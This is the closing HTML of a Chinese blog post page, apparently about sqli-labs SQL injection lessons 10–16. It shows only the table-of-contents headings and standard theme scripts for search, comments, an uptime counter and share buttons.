class="nav-text">Less-10 基于时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-11-基于错误盲注"><span class="nav-number">4.</span> <span class="nav-text">Less-11 基于错误盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-12-基于错误盲注"><span class="nav-number">5.</span> <span class="nav-text">Less-12 基于错误盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-13-双注入查询"><span class="nav-number">6.</span> <span class="nav-text">Less-13 双注入查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-14-双注入查询"><span class="nav-number">7.</span> <span class="nav-text">Less-14 双注入查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-15-基于布尔-时间盲注"><span class="nav-number">8.</span> <span class="nav-text">Less-15 基于布尔/时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-16-基于布尔-时间盲注"><span class="nav-number">9.</span> <span class="nav-text">Less-16 基于布尔/时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">10.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Intro</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("02/08/2018 19:14:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
